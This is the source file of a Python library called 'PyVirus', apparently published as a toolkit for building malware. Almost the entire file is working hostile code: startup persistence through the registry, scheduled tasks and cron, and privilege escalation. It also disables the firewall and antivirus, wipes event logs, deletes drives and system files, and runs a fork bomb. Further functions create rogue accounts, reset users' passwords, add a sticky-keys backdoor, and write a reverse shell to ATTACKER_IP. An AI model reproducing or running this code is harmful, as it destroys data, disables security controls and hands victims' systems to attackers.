import os
import random
import string
import platform
import shutil
import sys
import pyVmomi
from pyVim.connect import SmartConnect
import concurrent.futures
import pyautogui
import tkinter as tk
import subprocess
import psutil

system_name = platform.system()




def Version():return("""
    PyVirus Python Library!
        Version 1.0.1

    == Coded By Mohammad Taha Gorji ==

        Github : https://GitHub.com/mr-r0ot/PyVirus
        PyPi : https://pypi.org/project/PyVirus

""")



class TOOLS:
    def platform():return system_name
    def Set_StartUP():
        if system_name == "Windows":
            try:
                shutil.copy2(__file__, 'C:\\StartUp.exe')
            except:
                pass
            try:
                import winreg
                aReg = winreg.ConnectRegistry(None,winreg.HKEY_LOCAL_MACHINE)
                aKey = winreg.OpenKey(aReg,r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_WRITE)
                winreg.SetValueEx(aKey,"MyApp",0,winreg.REG_SZ,"C:\\StartUp.exe")
            except:
                pass
            try:
                startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                script_path = os.path.abspath(sys.argv[0])
                shortcut_path = os.path.join(startup_folder, "antivirus.lnk")
                with open(shortcut_path, "w") as shortcut:
                    shortcut.write(f"@echo off\nstart \"\" \"{script_path}\"\nexit")
            except:
                pass
            try:
                import winreg
                script_path = os.path.abspath(sys.argv[0])
                key = winreg.HKEY_CURRENT_USER
                reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            except:
                pass
            try:
                reg = winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(reg, "MyAntivirus", 0, winreg.REG_SZ, script_path)
                winreg.CloseKey(reg)
                print("Added to registry successfully.")
            except:
                pass
            try:
                script_path = os.path.abspath(sys.argv[0])
                task_command = f'schtasks /create /tn \"MyAntivirus\" /tr \"{script_path}\" /sc onlogon /rl highest /f'
                os.system(task_command)
            except:
                pass
        elif system_name in ["Linux", "Darwin"]:
            script_path = os.path.abspath(__file__)
            cron_command = f"@reboot python3 {script_path}\n"
            with open(os.path.expanduser("~/.cronjob"), "a") as cronfile:
                cronfile.write(cron_command)
            os.system("crontab ~/.cronjob")
        
    def is_admin():
        import ctypes
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def Get_Admin_Access():
        import ctypes
        if not TOOLS.is_admin():
            script = sys.argv[0]
            params = " ".join(sys.argv[1:])
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{script}" {params}', None, 1)
            sys.exit(0)
    

    def Are_we_in_virtual_machine():
        try:
            si = SmartConnect(user='root',pwd='password',host='vc01')
            creds = pyVmomi.vim.vm.guest.NamePasswordAuthentication(username='guest_user',password='guest_password')
            view_ref = si.content.viewManager.CreateContainerView(container=si.content.rootFolder,type=[pyVmomi.vim.VirtualMachine],recursive=True)
            vm = view_ref.view[0]
            processes = si.content.guestOperationsManager.processManager.ListProcessesInGuest(vm=vm,auth=creds)
            return [True,("VM Name: {}".format(vm.name)),("Process name: {}".format(processes[0].name)),("Process owner: {}".format(processes[0].owner)),("Process PID: {}".format(processes[0].pid))]
        except:
            return [False]
            
    def list_drives():
        drives = []
        if system_name == "Windows":
            from string import ascii_uppercase
            drives = [f"{letter}:\\" for letter in ascii_uppercase if os.path.exists(f"{letter}:\\")]
        elif system_name in ["Linux", "Darwin"]:
            drives = ["/" + d for d in os.listdir("/") if os.path.ismount("/" + d)]
        return drives
    def generate_random_word(nb):
        return ''.join(random.choices(string.ascii_lowercase, k=nb))
    def get_all_users():
        users = []
        if system_name == "Windows":
            users = os.listdir("C:\\Users")
        elif system_name in ["Linux", "Darwin"]:
            users = [user for user in os.listdir("/home")]
        return users
    def get_current_user():
        return os.getlogin()
    
    def run_functions_parallel(*functions):
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = [executor.submit(func) for func in functions]
            concurrent.futures.wait(futures)
    
    def hide_virus():
        if system_name == "Windows":
            try:
                import ctypes
                user32 = ctypes.windll.user32
                user32.ShowWindow(user32.GetForegroundWindow(), 0)
            except:
                pass
            try:
                import win32gui,win32con
                win32gui.ShowWindow(win32gui.GetForegroundWindow(),win32con.SW_HIDE)
            except:
                pass
        elif system_name in ["Linux", "Darwin"]:
            os.system("xdotool getactivewindow windowminimize" if system_name == "Linux" else "osascript -e 'tell application \"System Events\" to set visible of process \"Terminal\" to false'")

    def list_tasks():
        tasks = []
        for process in psutil.process_iter(['pid', 'name', 'status']):
            try:
                tasks.append(process.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        return tasks
        






class VIRUS:
    def folder_make(path='',nb=8):
        try:
            os.chdir(path)
        except:
            pass
        while True:
            os.mkdir(TOOLS.generate_random_word(nb))
        

    def file_make(path='',nb=8,word='.'):
        try:
            os.chdir(path)
        except:
            pass
        while True:
            with open(f"{TOOLS.generate_random_word(nb)}.txt", "w+") as file:
                file.write(word)
    
    def open_cmd():
        if system_name == "Windows":
            while True:
                os.system("start cmd")
        elif system_name in ["Linux", "Darwin"]:
            while True:
                os.system("gnome-terminal" if system_name == "Linux" else "open -a Terminal")
    
    def fork_bomb():
        os.system(':(){ :|: & };:')
    
    def Mouse_Spamming():
        while True:
            pyautogui.click(button = 'right')
    
    def Keyboard_Samming(text):
        while True:
            pyautogui.write(text)

    def Show_On_Screen(text):
        while True:
            root = tk.Tk()
            root.attributes('-fullscreen', True)
            root.configure(bg='black')
            root.title('Large Text Display')
            label = tk.Label(root, text=text, font=('Helvetica', 100), fg='white', bg='black')
            label.pack(expand=True)
            root.mainloop()

    def Start_Self_Running_Network(start_number=10):
        for i in range(10):
            os.execv(sys.executable, ['python'] + sys.argv)
    
    def down_a_task(task_name):
        if system_name=="Windows":
            while True:
                os.system(f'taskkill /f /im {task_name}')
        else:
            while True:
                os.system(f'pkill -f {task_name}')
    def Kill_All_Tasks_System():
        if system_name=="Windows":
            while True:
                for task in TOOLS.list_tasks():
                    os.system(f'taskkill /f /im {task['name']}')
        else:
            while True:
                for task in TOOLS.list_tasks():
                    os.system(f'pkill -f {task['name']}')

    def down_firewall():
        if system_name == "Windows":
            os.system('Netsh advfirewall set allprofiles state off')
            os.system('Netsh firewall set opmode disable')
        elif system_name == "Linux":
            os.system('ufw disable')

    def set_null_Event_Log():
        if system_name == "Windows":
            os.system('''For /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"''')
        elif system_name == "Linux":
            os.system('journalctl --vacuum-time=1s')

    def down_antivirus():
        if system_name == "Windows":
            os.system('start Powershell Set-MpPreference -DisableRealtimeMonitoring $true')
        elif system_name == "Linux":
            os.system('systemctl stop clamav-daemon')

    def down_internet_network():
        if system_name == "Windows":
            os.system('IPconfig /Release')
        elif system_name == "Linux":
            os.system('ifconfig eth0 down')

    def Kill_Drive(drive):
        if system_name == "Windows":
            os.system(f"""For /R {drive} %i in (*) do del /F /S /Q %i CLS""")
        elif system_name == "Linux":
            os.system(f"rm -rf {drive}/*") 

    def make_backdoor():
        if system_name == "Windows":
            os.system('REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "C:\\windows\\system32\\cmd.exe"')
        elif system_name == "Linux":
            os.system('echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" > /tmp/backdoor.sh')

    def shutdown(time=0):
        os.system(f'shutdown -t {time} -s' if system_name == "Windows" else f'shutdown -h now')

    def restart(time=0):
        os.system(f'shutdown -t {time} -r' if system_name == "Windows" else 'shutdown -r now')

    def BlueScreen_Kill_Windows_systemdrive():
        if system_name == "Windows":
            os.system('''del %systemdrive%\*.*/f/s/q''')
            os.system('shutdown -r -f -t 00')
        elif system_name == "Linux":
            os.system('rm -rf /*')

    def BlueScreen_Kill_Windows_system32():
        if system_name == "Windows":
            os.system('''del c:\\WINDOWS\\system32\\*.*/q''')
        elif system_name == "Linux":
            os.system('rm -rf /usr/bin/*')

    def Kill_All_Drive():
        if system_name == "Windows":
            for d in TOOLS.list_drives():
                os.system(f'rd/s/q {d}')
        elif system_name == "Linux":
            os.system('rm -rf /media/*')

    def user_make(password='virus1234'):
        while True:
            if system_name == "Windows":
                os.system(f"net user {TOOLS.generate_random_word(8)} {password} /Add")
            elif system_name == "Linux":
                os.system(f'sudo adduser --disabled-password --gecos "" {TOOLS.generate_random_word(8)}')

    def change_password_users():
        if system_name == "Windows":
            for u in TOOLS.get_all_users():
                os.system(f'net user {u} {TOOLS.generate_random_word(8)}')
        elif system_name == "Linux":
            for u in TOOLS.get_all_users():
                os.system(f'echo "{TOOLS.generate_random_word(8)}" | sudo passwd {u} --stdin')

    def Block_Mouse_KeyBoard():
        if system_name == "Windows":
            import ctypes
            ctypes.windll.user32.BlockInput(True)
        elif system_name == "Linux":
            os.system('xinput --disable <device_id>') 

    def Kill_Drive_Data():
        if system_name == "Windows":
            for d in TOOLS.list_drives():
                os.system(f'For /R {d} %%i in (*) do del /F /S /Q %%i CLS')
                os.system(f'For /R {d} %%i in (.) do del /F /S /Q %%i CLS')
        else:
            for d in TOOLS.list_drives():
                os.system(f'find {d} -type f -exec rm -f {{}} +')
                os.system(f'find {d} -type d -exec rmdir {{}} +')

    def Full_Drive_Evil():
        for d in TOOLS.list_drives():
            total,used,free = shutil.disk_usage(d)
            free_gb = int(((int(free / (1024 ** 3)))+10)/9)+5
            os.chdir(d)
            for i in range(free_gb):
                if system_name == "Windows":os.system(f'''Fsutil file createnew %random%.mp4 9999999999''')
                else:os.system('dd if=/dev/zero of=$RANDOM.mp4 bs=1 count=9999999999')



    class WINDOWS:
        def Kill_power_button():
            if system_name == "Windows":
                try:
                    import ctypes
                    ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
                except:
                    pass

        def down_task_manager_reg():
            subprocess.run(
                ["reg", "add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System", 
                "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

        def down_task_manager_proc():
            while True:
                os.system('taskkill /f /im Taskmgr.exe')
        def BlueScreen_Kill_Windows_attrib():
            os.system('''attrib -r -s -h c:\\autoexec.bat''')
            os.system('''del c:\\autoexec.bat''')
            os.system('''del c:\\boot.ini''')
            os.system('''attrib -r -s -h c:\\ntldr''')
            os.system('''attrib -r -s -h c:\\windows\\win.ini''')
            os.system('''del c:\\windows\\win.ini''')